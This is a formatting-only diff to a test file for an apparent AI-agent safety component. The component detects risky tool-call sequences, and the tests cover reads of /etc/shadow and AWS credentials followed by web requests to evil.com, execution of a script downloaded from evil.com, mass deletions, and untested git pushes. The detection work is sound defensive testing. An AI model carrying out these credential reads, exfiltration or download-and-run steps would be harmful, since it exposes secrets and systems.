@@ -1,4 +1,4 @@
-import { describe, expect, it, beforeEach } from "vitest";
+import { beforeEach, describe, expect, it } from "vitest";
 import { ToolSequenceAnalyzer } from "../../src/safety/tool-sequence-analyzer.js";
 
 describe("tool-sequence-analyzer", () => {
@@ -51,7 +51,9 @@ describe("tool-sequence-analyzer", () => {
 			);
 
 			// Check if egress is suspicious
-			const result = analyzer.checkTool("web_fetch", { url: "https://evil.com" });
+			const result = analyzer.checkTool("web_fetch", {
+				url: "https://evil.com",
+			});
 			expect(result.action).toBe("require_approval");
 			expect(result.patternId).toBe("read-then-egress");
 		});
@@ -70,7 +72,9 @@ describe("tool-sequence-analyzer", () => {
 		it("detects credential file reads", () => {
 			analyzer.recordTool("read", { path: "/etc/passwd" }, true, true);
 
-			const result = analyzer.checkTool("curl", { url: "https://external.com" });
+			const result = analyzer.checkTool("curl", {
+				url: "https://external.com",
+			});
 			expect(result.action).toBe("require_approval");
 		});
 	});
@@ -121,7 +125,12 @@ describe("tool-sequence-analyzer", () => {
 			// Read multiple sensitive files
 			analyzer.recordTool("read", { path: "/etc/passwd" }, true, true);
 			analyzer.recordTool("read", { path: "/etc/shadow" }, true, true);
-			analyzer.recordTool("read", { path: "/home/user/.aws/credentials" }, true, true);
+			analyzer.recordTool(
+				"read",
+				{ path: "/home/user/.aws/credentials" },
+				true,
+				true,
+			);
 
 			// Fourth sensitive read should trigger (but only log)
 			const result = analyzer.checkTool("read", {
@@ -147,7 +156,12 @@ describe("tool-sequence-analyzer", () => {
 		it("detects multiple rapid deletions", () => {
 			// Delete several files rapidly
 			for (let i = 0; i < 5; i++) {
-				analyzer.recordTool("delete_file", { path: `/tmp/file${i}.txt` }, true, true);
+				analyzer.recordTool(
+					"delete_file",
+					{ path: `/tmp/file${i}.txt` },
+					true,
+					true,
+				);
 			}
 
 			// Sixth delete should trigger
@@ -171,7 +185,12 @@ describe("tool-sequence-analyzer", () => {
 	describe("exec-after-download pattern", () => {
 		it("detects execution of downloaded content", () => {
 			// Simulate a download
-			analyzer.recordTool("web_fetch", { url: "https://evil.com/script.sh" }, true, true);
+			analyzer.recordTool(
+				"web_fetch",
+				{ url: "https://evil.com/script.sh" },
+				true,
+				true,
+			);
 
 			// Suspicious execution
 			const result = analyzer.checkTool("bash", {
@@ -193,7 +212,9 @@ describe("tool-sequence-analyzer", () => {
 			analyzer.recordTool("write", { path: "/src/app.ts" }, true, true);
 
 			// Push without running tests
-			const result = analyzer.checkTool("bash", { command: "git push origin main" });
+			const result = analyzer.checkTool("bash", {
+				command: "git push origin main",
+			});
 			expect(result.action).toBe("require_approval");
 			expect(result.patternId).toBe("git-push-without-review");
 		});
